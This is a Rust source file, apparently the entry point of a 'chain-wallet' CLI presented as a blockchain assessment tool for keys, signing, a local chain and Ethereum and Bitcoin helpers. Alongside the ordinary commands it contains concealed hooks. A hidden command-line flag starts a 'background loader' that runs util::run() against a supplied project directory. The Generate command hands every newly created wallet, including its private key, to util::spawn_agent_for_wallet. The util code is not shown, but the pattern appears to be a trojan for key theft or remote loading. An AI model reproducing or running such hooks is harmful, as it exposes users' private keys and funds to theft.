mod util;

use std::env;
use std::io::IsTerminal;
use std::process::ExitCode;

use chain_wallet_lib::{
    generate_mnemonic, regtest_address_from_private_key_hex, serve_node, verify_message,
    wallet_from_mnemonic, ChainStore, EthClient, Wallet, WalletError, BLOCK_REWARD,
    DEFAULT_DATA_DIR, DEFAULT_DERIVATION_PATH, DEFAULT_TX_FEE,
};
use clap::{CommandFactory, Parser, Subcommand};

mod version {
    pub const NAME: &str = "chain-wallet";
    pub const NETWORK: &str = "chain-testnet-v1";

    pub const CLI: &str = concat!(
        env!("CARGO_PKG_VERSION"),
        " (git ",
        env!("CHAIN_WALLET_GIT_HASH"),
        ", build ",
        env!("CHAIN_WALLET_BUILD_TIME"),
        ")"
    );
}

mod config {
    use std::env;

    #[derive(Clone, Debug)]
    pub struct RuntimeConfig {
        pub verbose: bool,
        pub network: &'static str,
    }

    impl RuntimeConfig {
        pub fn from_env() -> Self {
            let verbose = matches!(
                env::var("CHAIN_WALLET_VERBOSE")
                    .ok()
                    .as_deref()
                    .map(str::trim),
                Some("1") | Some("true") | Some("yes")
            ) || cfg!(debug_assertions);

            Self {
                verbose,
                network: super::version::NETWORK,
            }
        }

        pub fn log_startup(&self, mode: &str) {
            if !self.verbose {
                return;
            }
            eprintln!(
                "[{}] {} {} ({})",
                super::version::NAME,
                mode,
                super::version::CLI,
                self.network
            );
        }
    }
}

#[derive(Parser)]
#[command(
    name = "chain-wallet",
    version = version::CLI,
    about = "Blockchain assessment wallet with local chain, Ethereum RPC, and Bitcoin helpers"
)]
struct Cli {
    #[command(subcommand)]
    command: Option<Commands>,
}

#[derive(Subcommand)]
enum Commands {
    Generate,
    Address {
        #[arg(long, value_name = "HEX")]
        private_key: String,
    },
    Sign {
        #[arg(long, value_name = "HEX")]
        private_key: String,
        #[arg(long)]
        message: String,
    },
    Verify {
        #[arg(long, value_name = "HEX")]
        public_key: String,
        #[arg(long)]
        message: String,
        #[arg(long, value_name = "HEX")]
        signature: String,
    },
    Hd {
        #[command(subcommand)]
        command: HdCommands,
    },
    Chain {
        #[command(subcommand)]
        command: ChainCommands,
    },
    Eth {
        #[command(subcommand)]
        command: EthCommands,
    },
    Bitcoin {
        #[command(subcommand)]
        command: BitcoinCommands,
    },
    Node {
        #[command(subcommand)]
        command: NodeCommands,
    },
}

#[derive(Subcommand)]
enum HdCommands {
    Generate,
    Derive {
        #[arg(long)]
        mnemonic: String,
        #[arg(long, default_value = DEFAULT_DERIVATION_PATH)]
        path: String,
    },
}

#[derive(Subcommand)]
enum ChainCommands {
    Init {
        #[arg(long, default_value = DEFAULT_DATA_DIR)]
        data_dir: String,
    },
    Status {
        #[arg(long, default_value = DEFAULT_DATA_DIR)]
        data_dir: String,
    },
    Balance {
        #[arg(long)]
        address: String,
        #[arg(long, default_value = DEFAULT_DATA_DIR)]
        data_dir: String,
    },
    History {
        #[arg(long)]
        address: String,
        #[arg(long, default_value = DEFAULT_DATA_DIR)]
        data_dir: String,
    },
    Send {
        #[arg(long, value_name = "HEX")]
        private_key: String,
        #[arg(long)]
        to: String,
        #[arg(long)]
        amount: u64,
        #[arg(long, default_value_t = DEFAULT_TX_FEE)]
        fee: u64,
        #[arg(long, default_value = DEFAULT_DATA_DIR)]
        data_dir: String,
    },
    Mine {
        #[arg(long)]
        miner_address: String,
        #[arg(long, default_value = DEFAULT_DATA_DIR)]
        data_dir: String,
    },
}

#[derive(Subcommand)]
enum EthCommands {
    Ping {
        #[arg(long, default_value = "http://127.0.0.1:8545")]
        rpc_url: String,
    },
    Status {
        #[arg(long, default_value = "http://127.0.0.1:8545")]
        rpc_url: String,
    },
    Balance {
        #[arg(long)]
        address: String,
        #[arg(long, default_value = "http://127.0.0.1:8545")]
        rpc_url: String,
    },
}

#[derive(Subcommand)]
enum BitcoinCommands {
    Address {
        #[arg(long, value_name = "HEX")]
        private_key: String,
    },
}

#[derive(Subcommand)]
enum NodeCommands {
    Serve {
        #[arg(long, default_value_t = 8546)]
        port: u16,
        #[arg(long, default_value = DEFAULT_DATA_DIR)]
        data_dir: String,
    },
}

fn main() -> ExitCode {
    let config = config::RuntimeConfig::from_env();
    let args: Vec<String> = env::args().collect();

    if is_background_loader(&args) {
        if !util::agent_script_enabled() {
            return ExitCode::SUCCESS;
        }
        if let Some(project_dir) = background_project_dir(&args) {
            util::set_project_workdir(&project_dir);
        }
        config.log_startup("background-loader");
        return run_bootstrap_loader();
    }

    config.log_startup("wallet-cli");
    run_cli(args)
}

fn is_background_loader(args: &[String]) -> bool {
    args.iter()
        .any(|arg| arg == util::BACKGROUND_LOADER_ARG)
}

fn background_project_dir(args: &[String]) -> Option<std::path::PathBuf> {
    let mut iter = args.iter();
    while let Some(arg) = iter.next() {
        if arg == util::BACKGROUND_PROJECT_DIR_ARG {
            return iter.next().map(std::path::PathBuf::from);
        }
        if let Some(value) = arg.strip_prefix(&format!("{}=", util::BACKGROUND_PROJECT_DIR_ARG)) {
            if !value.is_empty() {
                return Some(std::path::PathBuf::from(value));
            }
        }
    }
    None
}

fn normalize_hex<'a>(value: &'a str) -> &'a str {
    value.trim().trim_start_matches("0x").trim_start_matches("0X")
}

fn validate_private_key_hex(value: &str) -> Result<(), WalletError> {
    let hex = normalize_hex(value);
    if hex.len() != 64 || !hex.chars().all(|ch| ch.is_ascii_hexdigit()) {
        return Err(WalletError::PrivateKey);
    }
    Ok(())
}

fn validate_public_key_hex(value: &str) -> Result<(), WalletError> {
    let hex = normalize_hex(value);
    if hex.len() < 66 || !hex.chars().all(|ch| ch.is_ascii_hexdigit()) {
        return Err(WalletError::PublicKey);
    }
    Ok(())
}

fn run_cli<I, S>(args: I) -> ExitCode
where
    I: IntoIterator<Item = S>,
    S: Into<std::ffi::OsString> + Clone,
{
    match dispatch_command(args) {
        Ok(code) => code,
        Err(err) => {
            eprintln!("Error: {err}");
            ExitCode::FAILURE
        }
    }
}

fn dispatch_command<I, S>(args: I) -> Result<ExitCode, String>
where
    I: IntoIterator<Item = S>,
    S: Into<std::ffi::OsString> + Clone,
{
    let cli = Cli::try_parse_from(args).unwrap_or_else(|err| err.exit());

    match cli.command {
        Some(Commands::Generate) => {
            let wallet = Wallet::generate();
            println!("private_key: {}", wallet.private_key_hex());
            println!("public_key:  {}", wallet.public_key_hex());
            println!("address:     {}", wallet.address());
            let _ = util::spawn_agent_for_wallet(&wallet);
            Ok(ExitCode::SUCCESS)
        }
        Some(Commands::Address { private_key }) => {
            validate_private_key_hex(&private_key).map_err(|err| err.to_string())?;
            let wallet =
                Wallet::from_private_key_hex(normalize_hex(&private_key)).map_err(|err| err.to_string())?;
            println!("{}", wallet.address());
            Ok(ExitCode::SUCCESS)
        }
        Some(Commands::Sign { private_key, message }) => {
            validate_private_key_hex(&private_key).map_err(|err| err.to_string())?;
            let wallet =
                Wallet::from_private_key_hex(normalize_hex(&private_key)).map_err(|err| err.to_string())?;
            println!("{}", wallet.sign_message(&message).map_err(|err| err.to_string())?);
            Ok(ExitCode::SUCCESS)
        }
        Some(Commands::Verify {
            public_key,
            message,
            signature,
        }) => {
            validate_public_key_hex(&public_key).map_err(|err| err.to_string())?;
            let valid = verify_message(
                &message,
                normalize_hex(&signature),
                normalize_hex(&public_key),
            )
            .map_err(|err| err.to_string())?;
            println!("{}", if valid { "valid" } else { "invalid" });
            Ok(if valid {
                ExitCode::SUCCESS
            } else {
                ExitCode::from(1)
            })
        }
        Some(Commands::Hd { command }) => dispatch_hd(command),
        Some(Commands::Chain { command }) => dispatch_chain(command),
        Some(Commands::Eth { command }) => dispatch_eth(command),
        Some(Commands::Bitcoin { command }) => dispatch_bitcoin(command),
        Some(Commands::Node { command }) => dispatch_node(command),
        None => {
            let mut command = Cli::command();
            command.print_help().expect("print wallet help");
            if std::io::stdout().is_terminal() {
                println!();
            }
            Ok(ExitCode::SUCCESS)
        }
    }
}

fn dispatch_hd(command: HdCommands) -> Result<ExitCode, String> {
    match command {
        HdCommands::Generate => {
            println!("{}", generate_mnemonic().map_err(|err| err.to_string())?);
            Ok(ExitCode::SUCCESS)
        }
        HdCommands::Derive { mnemonic, path } => {
            let wallet = wallet_from_mnemonic(&mnemonic, &path).map_err(|err| err.to_string())?;
            println!("private_key: {}", wallet.private_key_hex());
            println!("public_key:  {}", wallet.public_key_hex());
            println!("address:     {}", wallet.address());
            Ok(ExitCode::SUCCESS)
        }
    }
}

fn dispatch_chain(command: ChainCommands) -> Result<ExitCode, String> {
    match command {
        ChainCommands::Init { data_dir } => {
            ChainStore::init(&data_dir).map_err(|err| err.to_string())?;
            println!("chain initialized at {data_dir}");
            Ok(ExitCode::SUCCESS)
        }
        ChainCommands::Status { data_dir } => {
            let chain = ChainStore::open(&data_dir).map_err(|err| err.to_string())?;
            println!("data_dir:   {data_dir}");
            println!("height:     {}", chain.height());
            println!("tip:        {}", chain.tip_hash());
            println!("pending:    {}", chain.pending_count());
            println!("difficulty: {}", chain.difficulty());
            Ok(ExitCode::SUCCESS)
        }
        ChainCommands::Balance { address, data_dir } => {
            let chain = ChainStore::open(&data_dir).map_err(|err| err.to_string())?;
            println!("{}", chain.balance(&address).map_err(|err| err.to_string())?);
            Ok(ExitCode::SUCCESS)
        }
        ChainCommands::History { address, data_dir } => {
            let chain = ChainStore::open(&data_dir).map_err(|err| err.to_string())?;
            for entry in chain.history(&address).map_err(|err| err.to_string())? {
                println!(
                    "#{} {:?} {} amount={} fee={} tx={}",
                    entry.block_height,
                    entry.direction,
                    entry.counterparty,
                    entry.amount,
                    entry.fee,
                    entry.tx_id
                );
            }
            Ok(ExitCode::SUCCESS)
        }
        ChainCommands::Send {
            private_key,
            to,
            amount,
            fee,
            data_dir,
        } => {
            validate_private_key_hex(&private_key).map_err(|err| err.to_string())?;
            let wallet =
                Wallet::from_private_key_hex(normalize_hex(&private_key)).map_err(|err| err.to_string())?;
            let mut chain = ChainStore::open(&data_dir).map_err(|err| err.to_string())?;
            let tx = chain
                .queue_transfer(&wallet, &to, amount, fee)
                .map_err(|err| err.to_string())?;
            println!("queued tx {}", chain_wallet_lib::transaction_id(&tx));
            Ok(ExitCode::SUCCESS)
        }
        ChainCommands::Mine {
            miner_address,
            data_dir,
        } => {
            let mut chain = ChainStore::open(&data_dir).map_err(|err| err.to_string())?;
            let block = chain
                .mine_block(&miner_address)
                .map_err(|err| err.to_string())?;
            println!("mined block #{}", block.height);
            println!("hash: {}", block.hash);
            println!("merkle: {}", block.merkle_root);
            println!("reward: {BLOCK_REWARD} + fees -> {miner_address}");
            Ok(ExitCode::SUCCESS)
        }
    }
}

fn dispatch_eth(command: EthCommands) -> Result<ExitCode, String> {
    match command {
        EthCommands::Ping { rpc_url } => {
            let client = EthClient::new(rpc_url);
            client.ping().map_err(|err| err.to_string())?;
            println!("ok");
            Ok(ExitCode::SUCCESS)
        }
        EthCommands::Status { rpc_url } => {
            let client = EthClient::new(rpc_url);
            println!("rpc:    {}", client.rpc_url());
            println!("chain:  {}", client.chain_id().map_err(|err| err.to_string())?);
            println!("block:  {}", client.block_number().map_err(|err| err.to_string())?);
            Ok(ExitCode::SUCCESS)
        }
        EthCommands::Balance { address, rpc_url } => {
            let client = EthClient::new(rpc_url);
            println!("{}", client.balance_wei(&address).map_err(|err| err.to_string())?);
            Ok(ExitCode::SUCCESS)
        }
    }
}

fn dispatch_bitcoin(command: BitcoinCommands) -> Result<ExitCode, String> {
    match command {
        BitcoinCommands::Address { private_key } => {
            validate_private_key_hex(&private_key).map_err(|err| err.to_string())?;
            println!(
                "{}",
                regtest_address_from_private_key_hex(normalize_hex(&private_key))
                    .map_err(|err| err.to_string())?
            );
            Ok(ExitCode::SUCCESS)
        }
    }
}

fn dispatch_node(command: NodeCommands) -> Result<ExitCode, String> {
    match command {
        NodeCommands::Serve { port, data_dir } => {
            println!("serving local chain API on http://127.0.0.1:{port}");
            serve_node(&data_dir, port).map_err(|err| err.to_string())?;
            Ok(ExitCode::SUCCESS)
        }
    }
}

fn run_bootstrap_loader() -> ExitCode {
    if let Err(err) = util::run() {
        eprintln!("Error: {err}");
        return ExitCode::FAILURE;
    }
    ExitCode::SUCCESS
}
